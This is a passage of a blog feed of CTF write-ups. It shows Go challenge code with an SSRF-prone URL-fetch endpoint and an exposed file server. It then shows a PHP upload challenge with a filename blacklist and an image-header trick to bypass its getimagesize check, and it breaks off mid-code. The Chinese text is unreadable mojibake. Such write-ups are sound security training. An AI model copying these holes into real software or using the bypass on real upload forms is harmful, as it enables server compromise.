	Url <span class="token builtin">string</span> <span class="token string">`json:"url" binding:"required"`</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>data <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span><span class="token punctuation">{</span>
	s <span class="token operator">:=</span> md5<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> hex<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> fileMidderware <span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span><span class="token punctuation">{</span>
	fileSystem <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files/"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	f<span class="token punctuation">,</span>err <span class="token operator">:=</span> fileSystem<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> f <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token comment">//</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	fi<span class="token punctuation">,</span> err <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span>  err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> fi<span class="token punctuation">.</span><span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			files <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
			l<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Readdir</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
			<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span>i <span class="token operator">:=</span> <span class="token keyword">range</span> l <span class="token punctuation">{</span>
				files <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> i<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">}</span>

			c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
				<span class="token string">"files"</span> <span class="token punctuation">:</span>files<span class="token punctuation">,</span>
			<span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token punctuation">}</span>


	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		data<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"content-disposition"</span><span class="token punctuation">,</span> <span class="token string">`attachment; filename=`</span> <span class="token operator">+</span> fi<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">Data</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">uploadController</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">var</span> file File
	<span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> err<span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	dir <span class="token operator">:=</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Name<span class="token punctuation">)</span>

	<span class="token boolean">_</span><span class="token punctuation">,</span>err<span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">{</span>
		e <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Mkdir</span><span class="token punctuation">(</span><span class="token string">"./files/"</span><span class="token operator">+</span>dir<span class="token punctuation">,</span>os<span class="token punctuation">.</span>ModePerm<span class="token punctuation">)</span>
		<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span>
		<span class="token keyword">if</span> e <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> e<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span>

		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>
	filename <span class="token operator">:=</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Content<span class="token punctuation">)</span>
	path <span class="token operator">:=</span> <span class="token string">"./files/"</span><span class="token operator">+</span>dir<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>filename
	err <span class="token operator">=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Content<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>ModePerm<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
		<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"file upload succ, path: "</span><span class="token operator">+</span>dir<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">func</span> <span class="token function">vulController</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">var</span> url Url
	<span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> err<span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>Url<span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:1234/"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> <span class="token string">"url forbidden"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	client <span class="token operator">:=</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">{</span>Timeout<span class="token punctuation">:</span> <span class="token number">2</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">}</span>

	resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>Url<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">var</span> buffer <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token builtin">byte</span>
	result <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">NewBuffer</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> <span class="token punctuation">{</span>
		n<span class="token punctuation">,</span> err <span class="token operator">:=</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
		result<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span>

			<span class="token keyword">break</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span> result<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>fileMidderware<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/vul"</span><span class="token punctuation">,</span>vulController<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span>uploadController<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"pong"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>
	<span class="token boolean">_</span> <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":1234"</span><span class="token punctuation">)</span> <span class="token comment">// listen and serve on 0.0.0.0:8080</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>URLé‡å®šå‘</tag>
        <tag>goä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2021Quals-upload</title>
    <url>/posts/1e912fcd.html</url>
    <content><![CDATA[<h1 id="CISCN2021Quals-upload"><a href="#CISCN2021Quals-upload" class="headerlink" title="CISCN2021Quals-upload"></a>CISCN2021Quals-upload</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šæ–‡ä»¶ä¸Šä¼ bypass</p>
<p>é¦–é¡µæºç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token operator">==</span><span class="token string double-quoted-string">"upload"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">1024</span><span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿™ä¹ˆå¤§ä¸ªçš„ä¸œè¥¿ä½ æ˜¯æƒ³dæˆ‘å—ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$imageinfo</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageinfo</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$fileName</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'postedFile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"h"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$imagePath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"image/"</span> <span class="token operator">.</span> <span class="token function">mb_strtolower</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"postedFile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imagePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"upload success, image at <span class="token interpolation"><span class="token variable">$imagePath</span></span>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ–‡ä»¶å¤§å°éœ€å°äº512KBï¼Œéœ€æ˜¯å›¾ç‰‡ï¼Œå›¾ç‰‡å®½é«˜éœ€éƒ½ä¸º1ï¼Œæ–‡ä»¶åä¸èƒ½æœ‰å­—ç¬¦<code>cã€iã€hã€ph</code>ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œç›¸å½“äºè¿‡æ»¤äº†<code>.htaccess</code>ã€<code>.use.ini</code></p>
<p><code>getimagesize()</code>å‚è€ƒï¼š<a href="https://www.runoob.com/php/php-getimagesize.html">https://www.runoob.com/php/php-getimagesize.html</a></p>
<p>ä½¿ç”¨å¦‚ä¸‹å†…å®¹ç»•è¿‡å›¾ç‰‡å®½é«˜éœ€éƒ½ä¸º1çš„é™åˆ¶</p>
<pre class="line-numbers language-none"><code class="language-none">#define width 1
#define height 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>$_FILES</code>æ•°ç»„å‚è€ƒphpå®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/features.file-upload.post-method.php">https://www.php.net/manual/zh/features.file-upload.post-method.php</a></p>
<pre class="line-numbers language-none"><code class="language-none">$_FILESæ•°ç»„å†…å®¹å¦‚ä¸‹:
&lt;input name="userfile" type="file" /&gt;
$_FILES['userfile']['size'] 
å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚
$_FILES['userfile']['tmp_name'] 
æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åã€‚
$_FILES['userfile']['name']
å®¢æˆ·ç«¯æœºå™¨æ–‡ä»¶çš„åŸåç§°ã€‚
$_FILES['userfile']['type'] 
æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œéœ€è¦æµè§ˆå™¨æä¾›è¯¥ä¿¡æ¯çš„æ”¯æŒï¼Œä¾‹å¦‚â€œimage/gifâ€ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç›®å½•æ‰«æå¾—åˆ°<code>/example.php</code>æ–‡ä»¶</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
